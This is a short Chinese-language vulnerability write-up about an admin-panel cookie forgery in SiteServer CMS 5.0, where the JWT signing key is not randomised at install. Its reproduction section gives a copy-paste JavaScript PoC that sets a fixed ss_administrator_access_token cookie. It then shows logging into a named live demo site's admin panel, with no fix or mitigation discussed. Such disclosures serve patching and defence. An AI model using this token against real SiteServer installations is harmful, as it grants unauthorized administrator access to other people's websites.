SiteServer CMS 5.0 管理后台Cookie欺骗
=====================================

一、漏洞简介
------------

SiteServer CMS 5.0
后台访问控制采用JWT技术进行身份鉴别，HTTP请求时通过Cookie中的ss\_administrator\_access\_token字段值作为身份鉴别，而加密ss\_administrator\_access\_token字段值的key在安装时未进行随机初始化，导致所有相同版本的应用系统Cookie可以通用,通过修改Cookie可登陆任意相同版本后台。

二、漏洞影响
------------

SiteServer CMS 5.0

三、复现过程
------------

系统环境：IIS 7.5 + MSSQL 2008 R2 （操作系统：Windows Server 2008 R2）

先访问一个站点，以官方体验站点为例子：

http://cms.demo.siteserver.cn/siteserver/login.aspx

Chrome浏览器按F12切换到控制台，设置ss\_administrator\_access\_token的Cookie值（以下PoC可以直接使用）：

    document.cookie='ss_administrator_access_token=M3ENIa3NKJJ39JCRHnY4PgfJqMC7lFjggL0e9S06Bs9ubZE90add0xM2aesaL0add0Cxo8Xe5VZrSanerzFU8oZaMXCC9AoJfZvq5AtBXGxi0slash0tCRtk8UgV5UXu1u2pDL6htbwIqGBZx0slash0ZqVH4x0LjRE20slash0mz3FHc5QJFpTAKI0slash0AJ52LJ6XnWB7gsJuHFauL0add0q0add0sIMft8e3ef840gWzQaChpfGHfYwGS5wHFaC19T56X2J0Z5Hn500equals0'

再次访问（后面没有login.aspx）：

http://cms.demo.siteserver.cn/siteserver/

登陆成功
